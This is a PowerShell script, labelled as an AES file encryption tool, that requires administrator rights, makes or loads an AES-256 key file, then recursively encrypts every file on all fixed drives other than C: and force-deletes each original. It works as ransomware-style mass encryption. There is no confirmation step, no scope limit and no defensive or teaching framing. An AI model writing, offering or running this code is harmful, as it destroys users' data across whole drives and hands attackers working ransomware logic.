# AES File Encryption Script — Stores Key/IV in external file

# Ensure Admin Privileges
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "Please run this script as Administrator."
    exit
}

Write-Host "Running as Administrator.`n" -ForegroundColor Green

# AES Setup
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.KeySize = 256
$AES.BlockSize = 128
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# Key file setup
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$KeyFile = Join-Path $ScriptDir "aes.key"

if (-Not (Test-Path $KeyFile)) {
    # Generate new Key and IV
    $AES.GenerateKey()
    $AES.GenerateIV()

    $KeyText = [Convert]::ToBase64String($AES.Key)
    $IVText  = [Convert]::ToBase64String($AES.IV)

    "$KeyText`n$IVText" | Out-File -FilePath $KeyFile -Encoding ASCII -Force
    Write-Host "Generated new AES key and IV at $KeyFile" -ForegroundColor Yellow
} else {
    # Load existing Key and IV
    $KeyLines = Get-Content $KeyFile
    if ($KeyLines.Count -lt 2) {
        Write-Error "aes.key file is invalid or corrupted."
        exit
    }
    $AES.Key = [Convert]::FromBase64String($KeyLines[0])
    $AES.IV  = [Convert]::FromBase64String($KeyLines[1])
    Write-Host "Loaded AES key and IV from $KeyFile" -ForegroundColor Yellow
}

# Encryption Function
function Encrypt-File {
    param([string]$InputPath)

    try {
        $InputBytes = [System.IO.File]::ReadAllBytes($InputPath)
        $Encryptor = $AES.CreateEncryptor()
        $Encrypted = $Encryptor.TransformFinalBlock($InputBytes, 0, $InputBytes.Length)

        $EncryptedPath = "$InputPath.enc"
        [System.IO.File]::WriteAllBytes($EncryptedPath, $Encrypted)
        Remove-Item $InputPath -Force

        Write-Host "Encrypted: $InputPath" -ForegroundColor Green
    } catch {
        Write-Warning "Failed to encrypt ${InputPath}: $_"
    }
}

# Get all fixed drives except C:
$Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
    $_.IsReady -and
    $_.DriveType -eq 'Fixed' -and
    $_.Name -ne "C:\"
}

foreach ($Drive in $Drives) {
    Write-Host "`nScanning drive: $($Drive.Name)" -ForegroundColor Cyan

    try {
        $Files = Get-ChildItem -Path $Drive.Name -Recurse -File -ErrorAction SilentlyContinue
    } catch {
        Write-Warning "Failed to access $($Drive.Name): $_"
        continue
    }

    foreach ($File in $Files) {
        if ($File.Extension -ne ".enc") {
            Encrypt-File -InputPath $File.FullName
        }
    }
}

Write-Host "`nEncryption completed." -ForegroundColor Green
